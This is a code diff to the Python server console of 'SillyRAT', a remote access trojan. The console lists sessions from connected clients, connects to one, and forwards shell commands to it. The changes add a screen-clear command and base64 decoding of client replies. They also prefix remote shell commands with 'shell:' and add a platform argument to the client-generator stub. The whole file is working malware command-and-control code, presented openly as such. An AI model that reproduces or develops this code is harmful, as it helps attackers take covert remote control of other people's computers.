@@ -5,6 +5,7 @@ import time
 import base64
 import tabulate
 import signal
+import subprocess
 import argparse
 import threading
 
@@ -85,7 +86,8 @@ class PULL:
             ('help', 'Shows manual for commands'),
             ('sessions', 'Show all connected clients to the server'),
             ('connect', 'Connect to a Specific Client'),
-            ('generate', 'Generate a new Client Application')
+            ('generate', 'Generate a new Client Application'),
+            ('clear', 'Clear Screen'),
             ('shell'  , 'Launch a New Terminal/Shell.'),
             ('exit', 'Exit from SillyRAT!')
         ]
@@ -99,6 +101,8 @@ class PULL:
             ('help', 'Shows manual for commands'),
             ('sessions', 'Show all connected clients to the server'),
             ('connect', 'Connect to a Specific Client'),
+            ('generate', 'Generate a new Client Application'),
+            ('clear', 'Clear Screen'),
             ('exit', 'Exit from SillyRAT!')
         ]
         sys.stdout.write("\n")
@@ -129,7 +133,9 @@ class CLIENT:
                 break
             data += chunk.decode('utf-8')
             if self.KEY.encode('utf-8') in chunk:
-                self.MESSAGE = data.rstrip(self.KEY)
+                self.MESSAGE = base64.decodebytes(data.rstrip(self.KEY).encode('utf-8')).decode('utf-8')
+                if not self.MESSAGE:
+                    self.MESSAGE = " "
                 data = ""
 
     def engage(self):
@@ -146,7 +152,9 @@ class CLIENT:
                 pass
             except KeyboardInterrupt: 
                 break
-        return self.MESSAGE
+        rtval = self.MESSAGE
+        self.MESSAGE = ""
+        return rtval
 
 class COMMCENTER:
 
@@ -204,16 +212,19 @@ class COMMCENTER:
         sys.stdout.write("\n")
 
     def c_shell(self):
+        result = ""
         if self.CURRENT:
             sys.stdout.write("\n")
             while True:
                 val = input("# ")
-                val = val.rstrip(" ").lstrip(" ")
+                val = "shell:" + val.rstrip(" ").lstrip(" ")
 
                 if val:
-                    if val != "exit":
+                    if val != "shell:exit":
                         self.CURRENT[1].send_data(val)
-                        print(self.CURRENT[1].recv_data())
+                        result = self.CURRENT[1].recv_data()
+                        if result.strip(" "):
+                          print(result)  
                     else:
                         break
         else:
@@ -222,16 +233,20 @@ class COMMCENTER:
             sys.stdout.write("\n")
 
     def c_generate(self, vals):
-        if len(vals) == 4:
+        if len(vals) == 5:
             ip = vals[1]
             port = int(vals[2])
-            path = vals[3]
+            platform = vals[3]
+            path = vals[4]
 
             
         else:
             sys.stdout.write("\n")
             pull.error("Invalid Syntax!")
             sys.stdout.write("\n")
+
+    def c_clear(self):
+        subprocess.call(["clear"], shell=True)
 
     def c_exit(self):
         sys.stdout.write("\n")
@@ -304,6 +319,8 @@ class INTERFACE(COMMCENTER):
                 self.c_shell()
             elif vals[0] == "generate":
                 self.c_generate(vals)
+            elif vals[0] == "clear":
+                self.c_clear()
 
     def launch(self):
         pull.print("Launching Interface! Enter 'help' to get avaible commands! \n")
